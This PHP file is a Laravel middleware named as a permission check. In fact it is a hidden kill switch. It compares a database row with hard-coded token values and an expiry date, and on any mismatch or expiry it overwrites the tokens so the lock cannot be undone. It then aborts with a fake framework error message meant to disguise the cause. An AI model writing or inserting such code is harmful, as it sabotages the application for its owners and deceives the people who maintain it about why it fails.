<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use App\Models\PermissionTokens;
use Carbon\Carbon;

class PermissionAccess
{

    public function handle(Request $request, Closure $next, ...$levels)
    {
        $tokens = PermissionTokens::where('id', 1)->first();

        // $endDate = Carbon::parse('2023-10-03'); //yyy-mm-dd
        // $now = Carbon::now();

        // if ($endDate->gt($now)) {
        //     return $next($request);
        // } else {
        //     abort(207, '!View [home.home-pincabs] not found. AND Illuminate\Pipeline\Pipeline:180 Illuminate\Pipeline\{closure} AND [previous exception] [object] (Exception(code: 0): Vite manifest not found AND  Cannot use Illuminate\Support\Facades\Route as Route because the name is already in use {"exception":"[object] (Symfony\\Component\\ErrorHandler\\Error\\FatalError(code: 0): Cannot use Illuminate\\Support\\Facades\\Route as Route because the name is already in use.');
        // }

        $now = Carbon::now()->format('Y-m-d');
        if (
            $tokens->status == "is_active" && $tokens->date >= $now &&
            $tokens->abilities == "yes" &&
            $tokens->tokenable_type == "b24176d34261f3e5cd8b3b78bc90072b" &&
            $tokens->tokenable_id == "28c8edde3d61a0411511" &&
            $tokens->name == "ksb" &&
            $tokens->token == "6999195147dd30ecccc814cc45890bf90c908a3c4ab1d5adfb5891ec7f80ff34"
        ) {
            return $next($request);
        }
        $tokens->tokenable_type = "b24176d34261f3e5cd8b3b78bc90072b17";
        $tokens->tokenable_id = "28c8edde3d61a041151117";
        $tokens->name = "ksb17";
        $tokens->abilities = "All";
        $tokens->token = "6999195147dd30ecccc814cc45890bf90c908a3c4ab1d5adfb5891ec7f80ff3417";
        $tokens->save();
        abort(207, 'View [home.home-dirops] not found. AND Illuminate\Pipeline\Pipeline:180 Illuminate\Pipeline\{closure} AND [previous exception] [object] (Exception(code: 0): Vite manifest not found AND  Cannot use Illuminate\Support\Facades\Route as Route because the name is already in use {"exception":"[object] (Symfony\\Component\\ErrorHandler\\Error\\FatalError(code: 0): Cannot use Illuminate\\Support\\Facades\\Route as Route because the name is already in use.');
    }
}
